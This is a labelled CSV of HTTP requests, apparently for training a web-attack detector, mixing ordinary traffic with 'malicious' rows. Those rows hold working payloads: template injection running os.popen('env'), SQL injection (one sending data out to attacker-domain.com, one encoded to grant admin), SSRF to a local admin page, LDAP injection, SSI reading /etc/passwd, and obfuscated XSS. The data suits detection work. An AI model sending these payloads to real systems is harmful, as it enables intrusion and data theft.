label,text
benign,"DELETE /api/users/567 HTTP/1.1
Host: community.game-dev-forum.org
Authorization: Bearer mnbvcxzasdfghjklqwertyuiop123456
Accept: application/json
Accept-Language: en-US,en;q=0.9
User-Agent: Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.138 Mobile Safari/537.36
Connection: keep-alive"
benign,"POST /blog/comments HTTP/1.1
Host: my-personal-blog-site.info
User-Agent: Mozilla/5.0 (Linux; Android 12; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36
Content-Type: application/x-www-form-urlencoded
Content-Length: 95
Accept-Language: en-US,en;q=0.9
Cache-Control: max-age=0
Connection: keep-alive

comment=In+SQL%2C+the+DELETE+statement+is+used+to+remove+rows+from+a+table+based+on+specified+conditions."
benign,"GET /docs/tutorials/web-security/best-practices.pdf HTTP/1.1
Host: secure-user-portal.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/113.0.1774.57
Accept: application/pdf
Range: bytes=0-1023
DNT: 1
Connection: keep-alive
Accept-Encoding: gzip, deflate"
benign,"OPTIONS /api/v3/content/posts HTTP/1.1
Host: blogosphere-tech-portal.org
Origin: https://news-reader-app.xyz
Access-Control-Request-Method: GET
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:113.0) Gecko/20100101 Firefox/113.0
Accept: */*
Access-Control-Request-Headers: Authorization
Connection: keep-alive"
benign,"GET /browse/events?filter[type]=music&filter[date]=upcoming&sort_by=popularity_desc&page=1 HTTP/1.1
Host: pulse-community-hub.org
Connection: keep-alive
Accept: application/json
Referer: https://pulse-community-hub.org/home
User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
Accept-Encoding: gzip"
benign,"PUT /api/data/item123 HTTP/1.1
Host: smart-farm-automation.net
User-Agent: python-requests/2.31.0
Content-Type: text/plain
Content-Length: 27
Accept: */*
X-Requested-With: XMLHttpRequest
Connection: close

Irrigation cycle paused now."
malicious,"GET /search HTTP/1.1
Host: community.game-dev-forum.org
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1
Accept-Language: en-US,en;q=0.9
Referer: http://search.community.game-dev-forum.org/{#{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('env').read()}}#}"
benign,"GET /forum/topics/latest HTTP/1.1
Host: community.game-dev-forum.org
Connection: keep-alive
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Referer: https://community.game-dev-forum.org/
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_2_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Safari/605.1.15"
benign,"GET /blog/article/view/2568 HTTP/1.1
Host: my-personal-blog-site.info
Accept-Language: fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Safari/605.1.15
Cache-Control: max-age=0
Connection: keep-alive
Upgrade-Insecure-Requests: 1"
benign,"HEAD /api/v1/status HTTP/1.1
Host: api.cloud-data-services.ai
User-Agent: curl/7.88.1
Accept: */*
Connection: close"
malicious,"POST /admin/moderate_comment HTTP/1.1
Host: secure-user-portal.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Content-Length: 108
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Cache-Control: no-cache

comment_id=89&details_b64=cHJvZHVjdF9pZD0xMjM7IFVQREFURSB1c2VycyBTRVQgYWRtaW49MSBXSEVSRSBpZD0xIC0t"
benign,"POST /forum/new/thread HTTP/1.1
Host: community.game-dev-forum.org
Content-Type: application/x-www-form-urlencoded
Content-Length: 612
Referer: https://community.game-dev-forum.org/threads
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:110.0) Gecko/20100101 Firefox/110.0
Accept: text/html,application/xhtml+xml
Accept-Language: en-US,en;q=0.5
Connection: keep-alive
Cookie: user_session=abc123def456ghi789&preferences=threadView%3Dflat
X-CSRF-Token: WZx74F5qJyS3PkX2aVxTeMbHu8L9OwYdHPT1

title=How+to+optimize+movement+in+large+levels%3F&category=game+mechanics&tags=optimization%2Clevel+design%2Cperformance&body=I+have+a+big+map+and+players+complain+about+lag.+Any+tips+for+making+movement+smoother%3F+Also%2C+should+I+use+navmeshes+or+waypoints%3F&anonymous=no&notifyReplies=yes&subscribeThread=yes&font=default&priority=normal&language=en&showSignatures=yes&emailOnReply=yes&signature=Thanks%2C+John+G.&avatar=default&profileVisibility=public&allowMentions=yes&contentWarnings=no&threadType=discussion&allowEdits=yes&sticky=no&locked=no&moderatorReview=no"
benign,"GET /api/v2/inventory/item/4917f9ac23 HTTP/1.1
Host: market-data-exchange.org
Accept: application/json
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 15_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6 Mobile/15E148 Safari/604.1
Accept-Encoding: gzip, br
Referer: https://market-data-exchange.org/dashboard
Connection: keep-alive"
benign,"POST /api/log HTTP/1.1
Host: community.game-dev-forum.org
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_3_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Safari/605.1.15
Accept: application/json, text/plain
Content-Type: application/json
Content-Length: 282
Cache-Control: no-cache
Referer: https://community.game-dev-forum.org/forum/discussions/5672

{""event"":{""name"":""post_reply"",""timestamp"":""2024-06-12T12:02:09+02:00""},""user"":{""username"":""pixelCrafter"",""id"":""usr76542""},""metadata"":{""replyId"":""r78930"",""thread"":{""id"":""t3456"",""title"":""Best practices for shader programming""},""device"":{""type"":""desktop"",""os"":""macOS""}}}"
benign,"GET /resource/load?path=static/js/vendor/jquery.min.js HTTP/1.1
Host: online-retail-store.biz
User-Agent: curl/7.88.1
Accept: */*
Connection: close
Accept-Encoding: gzip, deflate"
benign,"GET /resources/fonts/open-sans.woff2 HTTP/1.1
Host: fonts-content-delivery.ai
User-Agent: Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/113.0
Accept: font/woff2,*/*;q=0.8
Accept-Encoding: gzip, deflate
If-None-Match: W/""7e2f9421fa""
Connection: keep-alive"
benign,"GET /api/v3/search?query=organic+coffee&limit=25&region=us-east HTTP/1.1
Host: eco-supplies-api.greenbiz.ai
Accept: application/json
Accept-Encoding: br, gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: keep-alive
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13.6; rv:116.0) Gecko/20100101 Firefox/116.0
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxOTY4MjMiLCJleHAiOjE4MDAwMDA1MDB9.Thu2vOgDVZWvw"
malicious,"GET /api/proxy?url=http://127.0.0.1:8080/admin/ HTTP/1.1
Host: service-tunneling-hub.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0
Accept: application/json, text/plain, */*
Accept-Language: en-GB,en;q=0.7
X-Requested-With: XMLHttpRequest
Connection: keep-alive"
malicious,"GET /catalog/item/view?id=%2527%2520OR%2520%28SELECT%2520LOAD_FILE%28CONCAT%28%2527%255C%255C%255C%255C%27%2C%28SELECT%2520version%28%29%29%2C%2527.attacker-domain.com%255C%255Cdata%2527%29%29%29--%2520 HTTP/1.1
Host: data-archive-store.biz
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br
Cache-Control: max-age=0
Connection: keep-alive
Cookie: session_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiam9obmRvZSIsImlhdCI6MTYxNjQyNjQwMH0.WnHfM_k1TRCB2OxPzMY9sQqMKGmEvgLdblCEVSoauQs"
benign,"POST /account/settings/save HTTP/1.1
Host: secure-user-portal.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 298
Connection: keep-alive
Accept: text/html,application/xhtml+xml
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Mobile/15E148 Safari/604.1
Referer: https://secure-user-portal.net/account/settings
X-CSRF-Token: d9e7c3b91fbb6f0a4ca176e921d69481
Cookie: session=4bc5a71e3f4a42e833b2b7ee8765a123

email_notifications=enabled&sms_notifications=disabled&language=en-US&timezone=America%2FNew_York&privacy_mode=standard&profile_visibility=friends&two_factor_auth=enabled&newsletter_subscribed=yes&text_size=medium&color_scheme=light&favorite_category=technology&start_page=dashboard&currency=USD&auto_logout=15&account_verified=verified&share_data=false&device_notifications=on&location_services=off&backup_emails=userbackup%40examplemail.net&default_payment=credit_card&secondary_email=user.secondary%40email.net&display_language=english&chat_support=enabled&notification_sound=default&font_style=sans-serif&restriction_level=low"
benign,"POST /submit_vote HTTP/1.1
Host: online-opinions-platform.net
Accept: */*
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 24
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Safari/605.1.15
Connection: close
Cookie: session_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
DNT: 1

poll_id=204&vote_option=B"
benign,"OPTIONS /api/v2/items HTTP/1.1
Host: data-sync-cloud.ai
Connection: keep-alive
User-Agent: Mozilla/5.0 (Linux; Android 12; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.138 Mobile Safari/537.36
Accept: */*
Access-Control-Request-Method: DELETE
Origin: https://app.data-sync-cloud.ai
Referer: https://app.data-sync-cloud.ai/settings
Sec-Fetch-Mode: cors"
benign,"POST /checkout/address HTTP/1.1
Host: online-retail-store.biz
User-Agent: Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.92 Mobile Safari/537.36
Content-Type: application/x-www-form-urlencoded
Content-Length: 131
Accept: application/json, text/plain, */*
Referer: https://online-retail-store.biz/cart
Origin: https://online-retail-store.biz
Connection: keep-alive

address_line_1=123+Maple+Street&city=Lakeview&zip=65982&country=US&redirect_uri=https%3A%2F%2Fonline-retail-store.biz%2Forder%2Fconfirmation"
benign,"POST /log HTTP/1.1
Host: session-tracker.ecom-analytics.biz
Origin: https://ecom-analytics.biz
Content-Type: text/plain
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
Content-Length: 38

event=add_to_cart&product=backpack&qty=1"
malicious,"POST /feedback/submit HTTP/1.1
Host: my-personal-blog-site.info
Content-Type: application/json
Content-Length: 160
Accept: application/json
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1
Cache-Control: no-cache

{""visitor_name"":""Evelyn"",""email"":""evelyn77@my-personal-blog-site.info"",""message"":""Enjoy your posts! FYI javascript:alert('XSS')""}"
benign,"POST /api/v2/projects/update HTTP/1.1
Host: community.game-dev-forum.org
User-Agent: curl/8.0.1
Content-Type: application/json
Content-Length: 55
Accept: */*
Connection: close

{""UNION ALL"": ""pending_approvals"",""project_id"": 78945}"
benign,"POST /contact/form HTTP/1.1
Host: myhealth-advice-center.org
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 89
User-Agent: Mozilla/5.0 (Linux; Android 12; SM-G990U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.198 Mobile Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Referer: https://myhealth-advice-center.org/contact
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.7
Cookie: session_token=3f86bd9e0f1c4a7a

name=Olivia&comment=VGhhbmtzIGZvciB5b3VyIGhlbHAgYW5kIHVzZWZ1bCBhZHZpY2Uu"
malicious,"POST /app/ldapsearch HTTP/1.1
Host: secure-ldap-service.io
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0
Content-Type: application/x-www-form-urlencoded
Accept: application/xml,application/xhtml+xml,text/html;q=0.9
Accept-Charset: utf-8, iso-8859-1;q=0.5
Cache-Control: no-cache
Content-Length: 53

user_id=validuser%29%28objectClass%3D*%29%26attributes%3D*"
benign,"POST /api/v1/user/login HTTP/1.1
Host: enterprise-horizon.io
Content-Type: application/x-www-form-urlencoded
Content-Length: 50
Referer: https://enterprise-horizon.io/api/v1/user/login
Origin: https://enterprise-horizon.io
Cookie: session=UQK0923ebnfgq2h9; csrf_token=4f7d9c88d5f4f285
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.49 Safari/537.36
Upgrade-Insecure-Requests: 1
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: keep-alive

email=mario.telesco%40enterprise.com&password=SummerFrost2022"
malicious,"GET /store/item/5' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e,(SELECT VERSION()),0x7e,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a) --/buy HTTP/1.1
Host: online-retail-store.biz
Connection: keep-alive
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Referer: https://online-retail-store.biz/cart
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1"
malicious,"PUT /api/v2/config/update HTTP/1.1
Host: online-retail-store.biz
Content-Type: application/json
Accept: application/json, text/plain, */*
User-Agent: Mozilla/5.0 (Linux; Android 9; SM-A505F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Mobile Safari/537.36
Sec-CH-UA: ""Chromium"";v=""86"", ""Google Chrome"";v=""86"", "";Not A Brand"";v=""99""
Sec-CH-UA-Mobile: ?0
Sec-CH-UA-Platform: ""Android""
Referer: https://online-retail-store.biz/dashboard
Content-Length: 154

{
  ""config"": {
    ""enable_feature_x"": true,
    ""exec_command"": ""<!--#exec cmd=\""c\""a\""t /etc/\""passwd\"" -->""
  }
}"
benign,"PATCH /api/v1/settings HTTP/1.1
Host: community.game-dev-forum.org
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:113.0) Gecko/20100101 Firefox/113.0
Content-Type: application/json-patch+json
Content-Length: 92
Authorization: Bearer q24v9zxrhc5gb857m0ld29uasf
Accept: application/json
Referer: https://community.game-dev-forum.org/settings

[{ ""op"": ""remove"", ""path"": ""/preferences/displayTimestamps"" }]"
malicious,"PATCH /api/search/items HTTP/1.1
Host: my-personal-blog-site.info
Content-Type: application/json
Content-Length: 310
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1
Origin: https://my-personal-blog-site.info
X-Requested-With: FetchAPIClient
Accept: application/json
Accept-Language: en-US,en;q=0.8
Cache-Control: no-cache

{""<img src=x onerror=\""eval(String.fromCharCode(0x61,108,0145,114,0x74,40,0x27,88,0x53,0123,45,0x4b,101,0x79,0x27,41))\"">"": ""search_key"", ""category"": ""tech"", ""max_results"": 25}"
benign,"POST /user/uploads/photos HTTP/1.1
Host: my-photo-backup.cloudphotoapp.io
Connection: keep-alive
Accept: image/webp,image/apng,image/*,*/*;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Referer: https://my-photo-backup.cloudphotoapp.io/gallery/recent
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryXzz84F1eM9pJseP4
Content-Length: 12584
Cookie: session_token=6yW9VjPwdQbtuNHMJKly9E55

------WebKitFormBoundaryXzz84F1eM9pJseP4
Content-Disposition: form-data; name=""files[]""; filename=""holiday_london.jpg""
Content-Type: image/jpeg

<JPEG binary data: 288967 bytes>
------WebKitFormBoundaryXzz84F1eM9pJseP4
Content-Disposition: form-data; name=""files[]""; filename=""family_bbq.png""
Content-Type: image/png

<PNG binary data: 174532 bytes>
------WebKitFormBoundaryXzz84F1eM9pJseP4--"
benign,"POST /newsletter/signup HTTP/1.1
Host: my-personal-blog-site.info
Content-Type: application/xml
Content-Length: 110
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Mobile/15E148 Safari/604.1
Accept: text/html,application/xhtml+xml,application/xml
Content-Language: en
Connection: keep-alive

<subscription><email>henry.wilson@examplemail.info</email><preferences><weeklyUpdates>true</weeklyUpdates><topic>technology</topic></preferences></subscription>"
benign,"GET /articles/health-and-wellness/mental-health-trends-2024 HTTP/1.1
Host: wellbeing-tier3.net
User-Agent: Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)
Accept: text/html,application/xml;q=0.6
Cache-Control: max-age=1200
Connection: keep-alive"
benign,"POST /accounts/password-reset/request HTTP/1.1
Host: event-management-suite.com
Content-Type: application/json
Accept: application/json
Cache-Control: no-store
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148
Content-Length: 50

{""email"":""daniel.james@event-management-suite.com""}"
benign,"GET /resource/load?file=content/tutorials/html/basics.html HTTP/1.1
Host: my-personal-blog-site.info
User-Agent: python-requests/2.28.2
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en
Connection: keep-alive"
benign,"GET /forum/thread/view?id=1245&title=Best+practices+for+C%2B%2B+developers%3F HTTP/1.1
Host: tech-discuss-community.dev
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:112.0) Gecko/20100101 Firefox/112.0
Accept-Language: en-GB,en;q=0.7
Accept-Encoding: gzip, deflate
Connection: keep-alive"
benign,"GET /v1/events/recent?pageToken=RXZlbnRzLTIwMjM=&filters=eyJzZXJ2aWNlIjoiY29mZmVlIn0= HTTP/1.1
Host: community.game-dev-forum.org
Accept: application/json
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:115.0) Gecko/20100101 Firefox/115.0
Accept-Language: en-GB,en;q=0.7
Connection: keep-alive"
benign,"GET /atom.xml HTTP/1.1
Host: travel-logs-journal.io
Accept: application/atom+xml
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1
Referer: https://travel-logs-journal.io/stories/europe-2023
DNT: 1
Connection: keep-alive"
benign,"GET /articles/health/wellness-tips-for-seniors HTTP/1.1
Host: greenpath-wellbeing.org
User-Agent: Twitterbot/1.0
Accept: text/html,application/xhtml+xml
Referer: https://twitter.com/user/status/1234567890
Accept-Encoding: gzip, deflate
Connection: keep-alive"
benign,"GET /robots.txt HTTP/1.1
Host: community.game-dev-forum.org
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Safari/605.1.15
Accept: text/plain
Accept-Language: en-GB,en;q=0.8
DNT: 1
Connection: keep-alive"
